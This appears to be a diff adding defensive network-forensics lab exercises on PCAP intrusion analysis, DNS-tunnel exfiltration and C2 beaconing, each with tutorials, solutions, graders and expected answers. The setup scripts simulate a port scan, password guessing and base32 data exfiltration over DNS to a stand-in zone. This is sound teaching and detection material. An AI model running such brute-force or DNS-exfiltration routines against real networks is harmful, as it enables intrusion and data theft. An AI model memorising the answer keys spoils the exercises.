@@ -1,0 +1,1618 @@
+track: defensive
+module: Network forensics & hardening
+profile: offsec
+order: 6
+exercises:
+
+- id: sec-045
+  title: Reconstruct the intrusion from the capture
+  difficulty: 4
+  kind: build
+  tags: [pcap, tshark, forensics, incident-response, http]
+  tutorial: |
+    **Concept.** A packet capture is a record of what actually crossed the wire. It doesn't depend on logs that can be edited or that nobody turned on. Analysing one is mostly filtering: start from a wide view, ask who talked to whom, narrow to the flows that matter, and read those in detail.
+
+    *Scans look different from use.* A port scan sends lots of SYNs to many ports and rarely finishes a handshake. Normal use goes to the one or two ports a service actually listens on.
+
+    *A SYN-ACK is an answer.* When a scanner probes a port, the reply tells you whether it was open. Open ports answer with SYN and ACK set; closed ports answer with RST.
+
+    *Application data is still there.* Unencrypted HTTP keeps its status codes, form bodies and response bodies in the capture. You can count failed logins by their status code, find the one that succeeded, and read what was sent in it.
+
+    *The capture has a clock.* Every frame has a timestamp, so an investigation can state the order of events and the time between them.
+
+    **Read up on:**
+    - `tshark -r FILE` and display filters (`-Y`), and how they differ from capture filters
+    - `tshark -T fields -e FIELD` and field names such as `ip.src`, `tcp.dstport`, `tcp.flags.syn`, `http.response.code`, `frame.time_relative`
+    - `tshark -q -z conv,tcp` and `-z http,tree` for summaries
+    - `tshark -q -z follow,tcp,ascii,N` to read one TCP stream
+    - `tshark --export-objects` to pull files out of HTTP
+  scenario: |
+    The web server at `10.20.0.10` was compromised. You have a capture from its network switch at **`/lab/incident.pcap`**. Other hosts on the network use the server normally, and a monitor polls it.
+
+    Write your findings to **`/lab/report.txt`** as `key=value` lines, one per finding.
+
+    ## Part 1: Find the attacker
+
+    One outside host scanned the server before attacking it. Record:
+
+    - `attacker_ip`: that host's address
+    - `open_ports`: the TCP ports the scan found open, ascending and comma-separated (for example `22,80`)
+
+    ## Part 2: How it got in
+
+    The attacker guessed passwords against the login form. Record:
+
+    - `failed_logins`: how many of the attacker's login attempts failed
+    - `password`: the password that finally worked
+
+    ## Part 3: What was taken
+
+    With a working session, the attacker exported one file, different from the file the normal users download. Record:
+
+    - `file_taken`: the exported file's name, without any path or query, for example `report.csv`
+
+    Save that file's exact contents, as sent by the server, to **`/lab/loot.csv`**.
+
+    ## Part 4: Timeline
+
+    Add three more keys, each a time in **seconds since the start of the capture**, as a whole or decimal number:
+
+    - `t_scan`: the attacker's first packet
+    - `t_login`: the server's reply accepting the attacker's correct password
+    - `t_export`: the server's reply that carried the exported file (its first data)
+
+    Times are accepted within 2 seconds.
+  hints:
+  - 'Part 1: normal users only ever connect to the web port. List the sources of SYN packets (no ACK) and the destination ports they try.'
+  - 'Part 1: open ports are the source ports of the SYN-ACK packets the server sent to the attacker.'
+  - 'Part 2: filter HTTP responses to the attacker by code. Look at which status means a failed login and which one means success.'
+  - 'Part 2: each attempt is its own TCP connection. `tcp.stream` from the success response finds the POST in the same stream.'
+  - 'Part 3: `tshark --export-objects http,/tmp/x` writes every HTTP object. A display filter (`-Y`) applies to exports too.'
+  - 'Part 4: add `-e frame.time_relative` to your field lists; the first matching frame answers each one.'
+  solution: |
+    ```bash
+    cd /lab
+    C=incident.pcap
+    ATT=$(tshark -r $C -Y 'tcp.flags.syn==1 && tcp.flags.ack==0 && tcp.dstport!=8080' -T fields -e ip.src 2>/dev/null | sort -u)
+    PORTS=$(tshark -r $C -Y "tcp.flags.syn==1 && tcp.flags.ack==1 && ip.dst==$ATT" -T fields -e tcp.srcport 2>/dev/null | sort -un | paste -sd,)
+    FAILED=$(tshark -r $C -Y "http.response.code==401 && ip.dst==$ATT" 2>/dev/null | wc -l)
+    STREAM=$(tshark -r $C -Y "http.response.code==302 && ip.dst==$ATT" -T fields -e tcp.stream 2>/dev/null | head -1)
+    tshark -r $C -q -z follow,tcp,ascii,$STREAM 2>/dev/null   # read the POST body for the password
+
+    mkdir -p /tmp/objs
+    tshark -r $C --export-objects http,/tmp/objs -Y "ip.addr==$ATT" 2>/dev/null
+    ls /tmp/objs    # the CSV the attacker pulled; copy it to /lab/loot.csv
+
+    tshark -r $C -Y "ip.src==$ATT" -T fields -e frame.time_relative 2>/dev/null | head -1
+    tshark -r $C -Y "http.response.code==302 && ip.dst==$ATT" -T fields -e frame.time_relative 2>/dev/null | head -1
+    tshark -r $C -Y "ip.dst==$ATT && http.content_type contains csv" -T fields -e frame.time_relative 2>/dev/null | head -1
+    ```
+
+    Write those values into `/lab/report.txt`.
+  setup: |
+    tshark_ready || { echo "tshark install failed" >&2; exit 1; }
+    mkdir -p /srv/kl/s45
+    cat >/srv/kl/s45/web.py <<'PY'
+    import os, secrets, urllib.parse as u
+    from http.server import BaseHTTPRequestHandler as B, ThreadingHTTPServer as S
+    USERS = {'admin': os.environ['APASS'], 'dana': 'dana-pw-2024', 'lee': 'lee-pw-2024'}
+    SESS = {}
+    SECRET = os.environ['SECRET_NAME']
+    FILES = {'price-list.csv': b'sku,price\n' + b''.join(b'%d,%d\n' % (i, i*7) for i in range(30))}
+    FILES[SECRET] = open('/srv/kl/s45/loot.csv', 'rb').read()
+    class H(B):
+        protocol_version = 'HTTP/1.1'
+        def log_message(self, *a): pass
+        def out(self, code, body=b'ok\n', ctype='text/plain', extra=()):
+            self.send_response(code)
+            self.send_header('Content-Type', ctype)
+            self.send_header('Content-Length', str(len(body)))
+            for k, v in extra: self.send_header(k, v)
+            self.end_headers(); self.wfile.write(body)
+        def do_GET(self):
+            p = u.urlparse(self.path); q = u.parse_qs(p.query)
+            if p.path == '/healthz': return self.out(200, b'healthy\n')
+            if p.path == '/': return self.out(200, b'<html><h1>Acme portal</h1></html>\n', 'text/html')
+            if p.path == '/admin/export':
+                c = self.headers.get('Cookie', '').replace('session=', '')
+                if c not in SESS: return self.out(401, b'login required\n')
+                name = (q.get('name') or [''])[0]
+                if name not in FILES: return self.out(404, b'no such file\n')
+                return self.out(200, FILES[name], 'text/csv')
+            self.out(404, b'not found\n')
+        def do_POST(self):
+            n = int(self.headers.get('Content-Length') or 0)
+            f = u.parse_qs(self.rfile.read(n).decode())
+            user = (f.get('user') or [''])[0]; pw = (f.get('pass') or [''])[0]
+            if self.path == '/login' and USERS.get(user) == pw:
+                sid = secrets.token_hex(8); SESS[sid] = user
+                return self.out(302, b'', extra=[('Location', '/admin'), ('Set-Cookie', 'session=' + sid)])
+            self.out(401, b'bad login\n')
+    S(('0.0.0.0', 8080), H).serve_forever()
+    PY
+    cat >/srv/kl/s45/sink.py <<'PY'
+    import socket
+    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('0.0.0.0', 2222)); s.listen(8)
+    while True:
+        c, _ = s.accept(); c.send(b'SSH-2.0-OpenSSH_9.6\r\n'); c.close()
+    PY
+    WEB=10.20.0.10; ATT=198.51.100.$((RANDOM%200+20))
+    lan_up web=$WEB/24 n1=10.20.0.21/24 n2=10.20.0.22/24 mon=10.20.0.50/24 att=$ATT/24
+    APASS="winter-$(head -c3 /dev/urandom | od -An -tx1 | tr -d ' \n')"
+    NAME="customers-$(head -c3 /dev/urandom | od -An -tx1 | tr -d ' \n').csv"
+    { echo id,name,card; for i in $(seq 1 40); do echo "$i,user$i,$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"; done; } >/srv/kl/s45/loot.csv
+    APASS=$APASS SECRET_NAME=$NAME ip netns exec web python3 /srv/kl/s45/web.py >/dev/null 2>&1 </dev/null &
+    ip netns exec web python3 /srv/kl/s45/sink.py >/dev/null 2>&1 </dev/null &
+    eventually 10 "ip netns exec n1 curl -fsS -o /dev/null http://$WEB:8080/healthz" || { echo "web did not start" >&2; exit 1; }
+    cap_start /lab/incident.pcap
+    # the other hosts behave normally the whole time
+    ip netns exec mon bash -c "while :; do curl -s -o /dev/null http://$WEB:8080/healthz; sleep 2; done" >/dev/null 2>&1 </dev/null &
+    ip netns exec n1 bash -c "for i in 1 2 3 4 5 6; do curl -s -o /dev/null -c /tmp/n1c -d 'user=dana&pass=dana-pw-2024' http://$WEB:8080/login; curl -s -o /dev/null -b /tmp/n1c 'http://$WEB:8080/admin/export?name=price-list.csv'; sleep 2.7; done" >/dev/null 2>&1 </dev/null &
+    ip netns exec n2 bash -c "curl -s -o /dev/null -d 'user=lee&pass=typo' http://$WEB:8080/login; for i in 1 2 3 4 5 6; do curl -s -o /dev/null -c /tmp/n2c -d 'user=lee&pass=lee-pw-2024' http://$WEB:8080/login; curl -s -o /dev/null -b /tmp/n2c 'http://$WEB:8080/admin/export?name=price-list.csv'; curl -s -o /dev/null http://$WEB:8080/; sleep 2.9; done" >/dev/null 2>&1 </dev/null &
+    sleep 2
+    ip netns exec att nmap -sS -Pn -n --max-retries 1 -p 21,22,23,25,80,443,2222,3306,5432,8080 $WEB >/dev/null 2>&1
+    sleep 2
+    FAILS=$((RANDOM%20+15))
+    for i in $(seq 1 $FAILS); do ip netns exec att curl -s -o /dev/null -d "user=admin&pass=guess$i" http://$WEB:8080/login; sleep 0.1; done
+    sleep 3
+    ip netns exec att curl -s -o /dev/null -c /tmp/attc -d "user=admin&pass=$APASS" http://$WEB:8080/login
+    sleep 3
+    ip netns exec att curl -s -o /dev/null -b /tmp/attc "http://$WEB:8080/admin/export?name=$NAME"
+    sleep 2
+    cap_stop; lan_down
+    C=/lab/incident.pcap
+    TS=$(tshark -r $C -Y "ip.src==$ATT" -T fields -e frame.time_relative 2>/dev/null | head -1)
+    TL=$(tshark -r $C -Y "http.response.code==302 && ip.dst==$ATT" -T fields -e frame.time_relative 2>/dev/null | head -1)
+    TE=$(tshark -r $C -Y "ip.dst==$ATT && http.content_type contains csv" -T fields -e frame.time_relative 2>/dev/null | head -1)
+    cat >"$KL_STATE/exp" <<E
+    ATT=$ATT
+    PORTS=2222,8080
+    FAILS=$FAILS
+    APASS=$APASS
+    NAME=$NAME
+    SHA=$(sha256sum /srv/kl/s45/loot.csv | cut -d' ' -f1)
+    TS=$TS
+    TL=$TL
+    TE=$TE
+    E
+    rm -rf /srv/kl/s45
+  check: |
+    . "$KL_STATE/exp"
+    f() { sed -n "s/^$1=//p" /lab/report.txt 2>/dev/null | head -1 | tr -d ' \r'; }
+    near() { awk -v a="$1" -v b="$2" 'BEGIN{if(a=="")exit 1; d=a-b; if(d<0)d=-d; exit !(d<=2)}'; }
+    info "Part 1: Find the attacker"
+    check "attacker_ip is correct" '[ "$(f attacker_ip)" = "$ATT" ]'
+    check "open_ports is correct" '[ "$(f open_ports)" = "$PORTS" ]'
+    info "Part 2: How it got in"
+    check "failed_logins is correct" '[ "$(f failed_logins)" = "$FAILS" ]'
+    check "password is correct" '[ "$(f password)" = "$APASS" ]'
+    info "Part 3: What was taken"
+    check "file_taken is correct" '[ "$(f file_taken)" = "$NAME" ]'
+    check "/lab/loot.csv matches what the server sent" '[ "$(sha256sum /lab/loot.csv | cut -d" " -f1)" = "$SHA" ]'
+    info "Part 4: Timeline"
+    check "t_scan is correct" 'near "$(f t_scan)" "$TS"'
+    check "t_login is correct" 'near "$(f t_login)" "$TL"'
+    check "t_export is correct" 'near "$(f t_export)" "$TE"'
+    kl_finish
+  solve: |
+    cd /lab
+    C=incident.pcap
+    ATT=$(tshark -r $C -Y 'tcp.flags.syn==1 && tcp.flags.ack==0 && tcp.dstport!=8080' -T fields -e ip.src 2>/dev/null | sort -u)
+    PORTS=$(tshark -r $C -Y "tcp.flags.syn==1 && tcp.flags.ack==1 && ip.dst==$ATT" -T fields -e tcp.srcport 2>/dev/null | sort -un | paste -sd,)
+    FAILED=$(tshark -r $C -Y "http.response.code==401 && ip.dst==$ATT" 2>/dev/null | wc -l)
+    STREAM=$(tshark -r $C -Y "http.response.code==302 && ip.dst==$ATT" -T fields -e tcp.stream 2>/dev/null | head -1)
+    PW=$(tshark -r $C -q -z follow,tcp,ascii,$STREAM 2>/dev/null | grep -oE 'pass=[A-Za-z0-9-]+' | head -1 | cut -d= -f2)
+    rm -rf /tmp/objs; mkdir -p /tmp/objs
+    tshark -r $C --export-objects http,/tmp/objs -Y "ip.addr==$ATT" >/dev/null 2>&1
+    OBJ=$(ls /tmp/objs | grep -a customers | head -1)
+    cp "/tmp/objs/$OBJ" /lab/loot.csv
+    NAME=$(printf '%s' "$OBJ" | grep -oE 'customers-[0-9a-f]+\.csv' | head -1)
+    TS=$(tshark -r $C -Y "ip.src==$ATT" -T fields -e frame.time_relative 2>/dev/null | head -1)
+    TL=$(tshark -r $C -Y "http.response.code==302 && ip.dst==$ATT" -T fields -e frame.time_relative 2>/dev/null | head -1)
+    TE=$(tshark -r $C -Y "ip.dst==$ATT && http.content_type contains csv" -T fields -e frame.time_relative 2>/dev/null | head -1)
+    cat >/lab/report.txt <<E
+    attacker_ip=$ATT
+    open_ports=$PORTS
+    failed_logins=$FAILED
+    password=$PW
+    file_taken=$NAME
+    t_scan=$TS
+    t_login=$TL
+    t_export=$TE
+    E
+
+- id: sec-046
+  title: Data leaving through DNS
+  difficulty: 4
+  kind: build
+  tags: [pcap, tshark, dns, exfiltration, forensics]
+  tutorial: |
+    **Concept.** DNS is allowed almost everywhere, and few networks inspect it. An attacker who controls a domain can send data out by encoding it in the names they look up: the query itself reaches the attacker's name server, whatever the answer is. This is a DNS tunnel.
+
+    *Tunnels have a shape.* A normal client looks up a few hundred names and repeats them. A tunnel produces a large number of unique names under one zone, usually with long labels of encoded data. Counting unique names per domain finds it quickly, where sorting by volume alone may not.
+
+    *Recovering the data.* Labels can only hold certain characters, so the payload is encoded, often in base32. Because each chunk travels in a separate UDP packet, tunnels usually carry a sequence number and may retransmit chunks. Packets can also be captured out of order. Put the unique chunks in order, then decode.
+
+    **Read up on:**
+    - `tshark -r FILE -Y dns -T fields -e dns.qry.name -e ip.src`
+    - `dns.flags.response` — queries versus responses
+    - `sort -u`, `uniq -c`, and `awk -F.` for splitting names by label
+    - `base32 -d` and what padding is; `tr a-z A-Z`
+    - `file` — identify what a recovered blob is
+  scenario: |
+    Someone suspects a workstation is leaking data out through DNS. **`/lab/dns.pcap`** is a capture of the office DNS traffic to the resolver at `10.30.0.53`.
+
+    Write your findings to **`/lab/report.txt`** as `key=value` lines.
+
+    ## Part 1: Find the tunnel
+
+    One zone is being abused. Record:
+
+    - `zone`: the domain under which the data is being sent (the part all the tunnel names end in, three labels long)
+    - `client`: the IP address of the host doing it
+
+    ## Part 2: Recover the data
+
+    Every tunnel query is `<seq>.<data>.<zone>`, where `<seq>` is a decimal sequence number from 0 and `<data>` is a chunk of **lowercase base32 without padding**. Some chunks were sent more than once, and the capture is not in sequence order.
+
+    Record:
+
+    - `chunks`: how many unique chunks were sent
+
+    Rebuild the original file and save it, byte for byte, to **`/lab/recovered.bin`**.
+
+    ## Part 3: Read what was taken
+
+    Work out what kind of file you recovered, and open it. Inside is a line holding a flag starting `KL{`. Save the flag on its own to **`/lab/flag.txt`**.
+  hints:
+  - 'Part 1: list the query names, cut each to its last three labels, and count how many unique names fall under each one.'
+  - 'Part 1: a long random-looking name on its own is not a tunnel. Count unique names per zone.'
+  - 'Part 2: pull only queries (`dns.flags.response==0`) under the zone, keep unique names, and split them on dots into a sequence number and a chunk.'
+  - 'Part 2: sort numerically on the sequence, concatenate the chunks, uppercase them, and add `=` padding to a multiple of 8 before `base32 -d`.'
+  - 'Part 3: `file` tells you the format of the recovered data.'
+  solution: |
+    ```bash
+    cd /lab
+    tshark -r dns.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name 2>/dev/null |
+      awk -F. '{print $(NF-2)"."$(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head
+    # the zone with thousands of names
+    ZONE=...
+    tshark -r dns.pcap -Y "dns.flags.response==0 && dns.qry.name contains \"$ZONE\"" -T fields -e dns.qry.name -e ip.src 2>/dev/null >q.txt
+    awk '{print $2}' q.txt | sort -u   # the client
+    cut -f1 q.txt | sort -u | awk -F. '{print $1, $2}' | sort -n | awk '{print $2}' | tr -d '\n' | tr a-z A-Z >b32.txt
+    wc -l < <(cut -f1 q.txt | sort -u)   # number of chunks
+    python3 -c "import base64;s=open('b32.txt').read();s+='='*(-len(s)%8);open('recovered.bin','wb').write(base64.b32decode(s))"
+    file recovered.bin
+    zcat recovered.bin | grep -o 'KL{[^}]*}' >flag.txt
+    ```
+  setup: |
+    tshark_ready || { echo "tshark install failed" >&2; exit 1; }
+    mkdir -p /srv/kl/s46
+    cat >/srv/kl/s46/dns.py <<'PY'
+    import socket, struct
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind(('0.0.0.0', 53))
+    while True:
+        d, a = s.recvfrom(1500)
+        i = 12
+        while d[i]: i += 1 + d[i]
+        i += 5
+        name_end = i
+        r = d[:2] + b'\x81\x80' + d[4:6] + b'\x00\x01\x00\x00\x00\x00' + d[12:name_end]
+        r += b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + bytes([10, 30, 1, d[-1] % 250 + 1])
+        s.sendto(r, a)
+    PY
+    R=10.30.0.53; VIC=$((RANDOM%4+1))
+    ADDRS="r=$R/24"
+    for i in 1 2 3 4; do ADDRS="$ADDRS w$i=10.30.0.2$i/24"; done
+    lan_up $ADDRS
+    ZONE="$(head -c3 /dev/urandom | od -An -tx1 | tr -d ' \n').updates-cdn.test"
+    FLAG=$(rand_flag)
+    { echo "customer export"; echo "$FLAG"; for i in $(seq 1 120); do echo "$i,$(head -c10 /dev/urandom | od -An -tx1 | tr -d ' \n')"; done; } | gzip -9 >/srv/kl/s46/secret
+    python3 - <<PY
+    import base64, random
+    d = open('/srv/kl/s46/secret', 'rb').read()
+    s = base64.b32encode(d).decode().rstrip('=').lower()
+    ch = [s[i:i+40] for i in range(0, len(s), 40)]
+    idx = list(range(len(ch)))
+    random.shuffle(idx)
+    idx += random.sample(idx, max(3, len(ch)//10))
+    random.shuffle(idx)
+    with open('/srv/kl/s46/names', 'w') as f:
+        for n in idx: f.write(f'{n}.{ch[n]}.$ZONE\n')
+    open('/srv/kl/s46/count', 'w').write(str(len(ch)))
+    PY
+    ip netns exec r python3 /srv/kl/s46/dns.py >/dev/null 2>&1 </dev/null &
+    eventually 10 "ip netns exec w1 dig +time=1 +tries=1 @$R example.test A | grep -q NOERROR" || { echo "dns did not start" >&2; exit 1; }
+    cap_start /lab/dns.pcap
+    NAMES="www.corp.test mail.corp.test git.corp.test wiki.corp.test files.corp.test cdn.example.test api.example.test img.example.test d1f8a3c7b9e204cc.static.cloudcdn.test"
+    for i in 1 2 3 4; do
+      [ "$i" = "$VIC" ] && continue
+      ip netns exec w$i bash -c "for k in \$(seq 1 40); do for n in $NAMES; do [ \$((RANDOM%3)) = 0 ] && dig +time=1 +tries=1 +short @$R \$n A >/dev/null; done; sleep 0.2; done" >/dev/null 2>&1 </dev/null &
+    done
+    ip netns exec w$VIC bash -c "for k in \$(seq 1 20); do for n in $NAMES; do [ \$((RANDOM%4)) = 0 ] && dig +time=1 +tries=1 +short @$R \$n A >/dev/null; done; sleep 0.3; done" >/dev/null 2>&1 </dev/null &
+    ip netns exec w$VIC bash -c "while read -r n; do dig +time=1 +tries=1 +short @$R \$n TXT >/dev/null; sleep 0.02; done </srv/kl/s46/names" >/dev/null 2>&1 </dev/null
+    sleep 1
+    # wait for the office traffic to finish
+    sleep 8
+    cap_stop; lan_down
+    cat >"$KL_STATE/exp" <<E
+    ZONE=$ZONE
+    VIC=10.30.0.2$VIC
+    CHUNKS=$(cat /srv/kl/s46/count)
+    SHA=$(sha256sum /srv/kl/s46/secret | cut -d' ' -f1)
+    FLAG=$FLAG
+    E
+    rm -rf /srv/kl/s46
+  check: |
+    . "$KL_STATE/exp"
+    f() { sed -n "s/^$1=//p" /lab/report.txt 2>/dev/null | head -1 | tr -d ' \r'; }
+    info "Part 1: Find the tunnel"
+    check "zone is correct" '[ "$(f zone)" = "$ZONE" ]'
+    check "client is correct" '[ "$(f client)" = "$VIC" ]'
+    info "Part 2: Recover the data"
+    check "chunks is correct" '[ "$(f chunks)" = "$CHUNKS" ]'
+    check "/lab/recovered.bin matches the original file" '[ "$(sha256sum /lab/recovered.bin | cut -d" " -f1)" = "$SHA" ]'
+    info "Part 3: Read what was taken"
+    check "the flag is correct" '[ "$(tr -d " \r\n" </lab/flag.txt)" = "$FLAG" ]'
+    kl_finish
+  solve: |
+    cd /lab
+    ZONE=$(tshark -r dns.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name 2>/dev/null | sort -u |
+      awk -F. '{print $(NF-2)"."$(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+    tshark -r dns.pcap -Y "dns.flags.response==0 && dns.qry.name contains \"$ZONE\"" -T fields -e dns.qry.name -e ip.src 2>/dev/null >/tmp/q.txt
+    C=$(awk '{print $2}' /tmp/q.txt | sort -u | head -1)
+    cut -f1 /tmp/q.txt | sort -u >/tmp/names
+    N=$(wc -l </tmp/names)
+    awk -F. '{print $1, $2}' /tmp/names | sort -n | awk '{printf "%s", $2}' | tr a-z A-Z >/tmp/b32
+    python3 -c "import base64;s=open('/tmp/b32').read();s+='='*(-len(s)%8);open('/lab/recovered.bin','wb').write(base64.b32decode(s))"
+    zcat recovered.bin | grep -o 'KL{[^}]*}' >flag.txt
+    printf 'zone=%s\nclient=%s\nchunks=%s\n' "$ZONE" "$C" "$N" >report.txt
+
+- id: sec-047
+  title: The beacon among normal traffic
+  difficulty: 4
+  kind: build
+  tags: [pcap, tshark, c2, beaconing, threat-hunting]
+  tutorial: |
+    **Concept.** Malware that has taken over a host usually phones home on a timer to ask for work. These check-ins are called beaconing. The content can look perfectly ordinary, so the useful property is the rhythm: connections from one host to one destination at nearly constant gaps, far more regular than a person browsing.
+
+    *Measure the gaps.* For each pair of source and destination, take the connection start times, subtract consecutive ones, and look at the spread. A small spread around a clear average is the signature. Malware often adds some jitter, but the average stays stable.
+
+    *Regular doesn't mean malicious.* Monitoring agents and update checks also run on timers. That's what an allowlist of known services is for: rule out what you can account for, then look at what remains.
+
+    **Read up on:**
+    - `tshark -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e frame.time_epoch -e ip.src -e ip.dst -e tcp.dstport`
+    - `awk` for differencing consecutive values within a group
+    - `tcp.stream` and `-z follow,tcp,ascii,N` for reading one connection
+    - the idea of jitter: variation around an average
+  scenario: |
+    A host on this network is suspected of beaconing to a command-and-control server. **`/lab/traffic.pcap`** covers the workstations `10.40.0.21` to `10.40.0.24`. Destinations you can account for are listed in **`/lab/allowlist.txt`**. The capture is short, so expect a lab-scale timer of a few seconds rather than minutes.
+
+    Write your findings to **`/lab/report.txt`** as `key=value` lines.
+
+    ## Part 1: Find the beacon
+
+    Record:
+
+    - `host`: the infected workstation
+    - `c2`: the C2 server's address
+    - `port`: the destination port
+    - `interval`: the beacon's average interval in seconds, rounded to a whole number (accepted within 1)
+    - `beacons`: how many check-ins are in the capture (accepted within 1)
+
+    ## Part 2: What was it told to do
+
+    Most responses tell the implant to wait. One was different. Record:
+
+    - `task`: the value of the `arg` field in that one response
+  hints:
+  - 'Part 1: list every connection start. Group by source and destination and compute the gaps between starts.'
+  - 'Part 1: discard destinations in the allowlist first, then find the pair with many connections and a stable gap.'
+  - 'Part 2: the responses are short JSON over plain HTTP. Search the conversation with `-z follow` or use `http.file_data`.'
+  solution: |
+    ```bash
+    cd /lab
+    tshark -r traffic.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields \
+      -e frame.time_epoch -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null >syn.txt
+    awk '{k=$2" "$3" "$4; if(k in last){d=$1-last[k]; n[k]++; s[k]+=d; ss[k]+=d*d} last[k]=$1}
+      END{for(k in n) if(n[k]>4){m=s[k]/n[k]; v=ss[k]/n[k]-m*m; printf "%s n=%d mean=%.2f sd=%.2f\n",k,n[k]+1,m,sqrt(v>0?v:0)}}' syn.txt | sort -t= -k4 -n
+    ```
+    Take the most regular pair that isn't in the allowlist. Then read its responses and find the one that isn't a wait.
+  setup: |
+    tshark_ready || { echo "tshark install failed" >&2; exit 1; }
+    mkdir -p /srv/kl/s47
+    cat >/srv/kl/s47/srv.py <<'PY'
+    import os, sys, json
+    from http.server import BaseHTTPRequestHandler as B, ThreadingHTTPServer as S
+    mode = sys.argv[1]; port = int(sys.argv[2])
+    state = {'n': 0}
+    task = os.environ.get('TASK', '')
+    tn = int(os.environ.get('TN', '0'))
+    class H(B):
+        protocol_version = 'HTTP/1.0'
+        def log_message(self, *a): pass
+        def do_GET(self):
+            if mode == 'c2':
+                state['n'] += 1
+                body = json.dumps({'task': 'collect', 'arg': task} if state['n'] == tn else {'task': 'wait'}).encode()
+            else:
+                body = (b'<html>' + os.urandom(64).hex().encode() * 8 + b'</html>')
+            self.send_response(200); self.send_header('Content-Type', 'application/json' if mode == 'c2' else 'text/html')
+            self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body)
+    S(('0.0.0.0', port), H).serve_forever()
+    PY
+    C2=203.0.113.$((RANDOM%200+20)); PORT=$((8000+RANDOM%900)); VIC=$((RANDOM%4+1))
+    IV=$((RANDOM%3+3))   # 3, 4 or 5 seconds
+    COUNT=12
+    TASK=$(head -c5 /dev/urandom | od -An -tx1 | tr -d ' \n'); TN=$((RANDOM%5+5))
+    lan_up mon=10.40.0.5/24 w1=10.40.0.21/24 w2=10.40.0.22/24 w3=10.40.0.23/24 w4=10.40.0.24/24 \
+      cdn=198.51.100.10/24 news=198.51.100.20/24 upd=198.51.100.30/24 c2=$C2/24
+    ip netns exec mon python3 /srv/kl/s47/srv.py web 9100 >/dev/null 2>&1 </dev/null &
+    for h in cdn news upd; do ip netns exec $h python3 /srv/kl/s47/srv.py web 80 >/dev/null 2>&1 </dev/null & done
+    TASK=$TASK TN=$TN ip netns exec c2 python3 /srv/kl/s47/srv.py c2 $PORT >/dev/null 2>&1 </dev/null &
+    eventually 10 "ip netns exec w1 curl -fsS -o /dev/null http://198.51.100.10/" || { echo "web did not start" >&2; exit 1; }
+    eventually 10 "ip netns exec w1 curl -fsS -o /dev/null http://$C2:$PORT/" || { echo "c2 did not start" >&2; exit 1; }
+    cat >/lab/allowlist.txt <<E
+    10.40.0.5 monitoring
+    198.51.100.10 cdn
+    198.51.100.20 news
+    198.51.100.30 updates
+    E
+    chown "$(lab_user)": /lab/allowlist.txt
+    cap_start /lab/traffic.pcap
+    TOTAL=$((IV*COUNT+2))
+    # every workstation is monitored on a strict timer
+    for i in 1 2 3 4; do
+      ip netns exec w$i bash -c "end=\$((SECONDS+$TOTAL)); while [ \$SECONDS -lt \$end ]; do curl -s -o /dev/null http://10.40.0.5:9100/heartbeat; sleep 3; done" >/dev/null 2>&1 </dev/null &
+    done
+    # and browses irregularly
+    for i in 1 2 3 4; do
+      ip netns exec w$i bash -c "end=\$((SECONDS+$TOTAL)); while [ \$SECONDS -lt \$end ]; do curl -s -o /dev/null http://198.51.100.\$((RANDOM%3*10+10))/page\$RANDOM; sleep \$(awk 'BEGIN{srand(); print 0.2+rand()*6}'); done" >/dev/null 2>&1 </dev/null &
+    done
+    ip netns exec w$VIC bash -c "for i in \$(seq 1 $COUNT); do curl -s -o /dev/null -A 'Mozilla/5.0' http://$C2:$PORT/api/v1/sync; sleep \$(awk -v i=$IV -v s=\$RANDOM 'BEGIN{srand(s); print i*(0.9+rand()*0.2)}'); done" >/dev/null 2>&1 </dev/null &
+    BEACON=$!
+    wait $BEACON
+    sleep 3
+    cap_stop; lan_down
+    N=$(tshark -r /lab/traffic.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0 && ip.dst==$C2" 2>/dev/null | wc -l)
+    cat >"$KL_STATE/exp" <<E
+    HOST=10.40.0.2$VIC
+    C2=$C2
+    PORT=$PORT
+    IV=$IV
+    N=$N
+    TASK=$TASK
+    E
+    rm -rf /srv/kl/s47
+  check: |
+    . "$KL_STATE/exp"
+    f() { sed -n "s/^$1=//p" /lab/report.txt 2>/dev/null | head -1 | tr -d ' \r'; }
+    near() { [ -n "$1" ] && [ "$1" -eq "$1" ] 2>/dev/null && d=$(( $1 - $2 )) && [ ${d#-} -le "$3" ]; }
+    info "Part 1: Find the beacon"
+    check "host is correct" '[ "$(f host)" = "$HOST" ]'
+    check "c2 is correct" '[ "$(f c2)" = "$C2" ]'
+    check "port is correct" '[ "$(f port)" = "$PORT" ]'
+    check "interval is correct" 'near "$(f interval)" "$IV" 1'
+    check "beacons is correct" 'near "$(f beacons)" "$N" 1'
+    info "Part 2: What was it told to do"
+    check "task is correct" '[ "$(f task)" = "$TASK" ]'
+    kl_finish
+  solve: |
+    cd /lab
+    tshark -r traffic.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields \
+      -e frame.time_epoch -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null >/tmp/syn.txt
+    grep -vFf <(awk '{print $1}' allowlist.txt) /tmp/syn.txt >/tmp/rest.txt
+    read -r h c p n m < <(awk '{k=$2" "$3" "$4; if(k in l){d=$1-l[k]; n[k]++; s[k]+=d} l[k]=$1}
+      END{for(k in n) if(n[k]>4) print k, n[k]+1, s[k]/n[k]}' /tmp/rest.txt | sort -k4 -rn | head -1)
+    iv=$(printf '%.0f' "$m")
+    S=$(tshark -r traffic.pcap -Y "ip.src==$c && http.file_data contains \"collect\"" -T fields -e tcp.stream 2>/dev/null | head -1)
+    T=$(tshark -r traffic.pcap -q -z follow,tcp,ascii,$S 2>/dev/null | grep -oE '"arg": *"[^"]*"' | sed 's/.*"arg": *"//;s/"$//')
+    printf 'host=%s\nc2=%s\nport=%s\ninterval=%s\nbeacons=%s\ntask=%s\n' "$h" "$c" "$p" "$iv" "$n" "$T" >report.txt
+
+- id: sec-048
